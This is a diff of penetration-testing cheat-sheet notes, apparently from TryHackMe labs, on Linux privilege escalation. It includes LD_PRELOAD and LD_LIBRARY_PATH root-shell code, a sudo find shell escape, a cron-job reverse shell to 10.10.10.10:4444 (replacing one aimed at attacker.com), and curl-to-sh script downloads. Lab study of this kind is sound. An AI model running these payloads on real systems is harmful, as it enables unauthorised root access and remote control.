@@ -13,7 +13,7 @@ Content Discovery
 
     robots.txt
     favicon
-        e.g. curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum
+        ; curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum
     sitemap.xml
     HTTP Headers
     Framework Stack (tìm framework gốc)
@@ -58,7 +58,7 @@ Enumeration
 Automated Enumeration Tools
 
     LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
-        curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+        ; curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
     LinEnum: https://github.com/rebootuser/LinEnum
     LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
     Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
@@ -79,27 +79,46 @@ Privilege Escalation: Sudo
 
     ## Shell Escape Sequences
     
+    sudo -l
+        ; (root) NOPASSWD: /usr/bin/find
     https://gtfobins.github.io/
-        e.g. sudo find . -exec /bin/sh \; -quit
+        ; sudo find . -exec /bin/sh \; -quit
     
     ## Environment Variables
 
+    ; LD_PRELOAD
     sudo -l
-    
-    env_keep+=LD_PRELOAD
-    
-        vim preload.c
-            #include <stdio.h>
-            #include <sys/types.h>
-            #include <stdlib.h>
+        ; env_keep+=LD_PRELOAD
+    vim preload.c
+        #include <stdio.h>
+        #include <sys/types.h>
+        #include <stdlib.h>
 
-            void _init() {
-                    unsetenv("LD_PRELOAD");
-                    setresuid(0,0,0);
-                    system("/bin/bash -p");
-            }
-        gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
-        sudo LD_PRELOAD=/tmp/preload.so find
+        void _init() {
+                unsetenv("LD_PRELOAD");
+                setresuid(0,0,0);
+                system("/bin/bash -p");
+        }
+    gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
+    sudo LD_PRELOAD=/tmp/preload.so apache2
+    
+    ; LD_LIBRARY_PATH
+    sudo -l
+        ; env_keep+=LD_LIBRARY_PATH
+    ldd /usr/sbin/apache2
+    vim library_path.c
+        #include <stdio.h>
+        #include <stdlib.h>
+
+        static void hijack() __attribute__((constructor));
+
+        void hijack() {
+                unsetenv("LD_LIBRARY_PATH");
+                setresuid(0,0,0);
+                system("/bin/bash -p");
+        }
+    gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c
+    sudo LD_LIBRARY_PATH=/tmp apache2
     
 Privilege Escalation: SUID
 
@@ -120,13 +139,12 @@ Privilege Escalation: Cron Jobs
     // victim
     cat /etc/crontab
     https://gtfobins.github.io/
-    e.g. vim backup.sh
-            export RHOST=attacker.com
-            export RPORT=12345
-            bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
-         chmod 777 backup.sh
+    vim backup.sh
+        #!/bin/bash
+        bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+     chmod 777 backup.sh
     // attacker
-    nc -lvnp 12345
+    nc -lvnp 4444
     
 Privilege Escalation: PATH
 
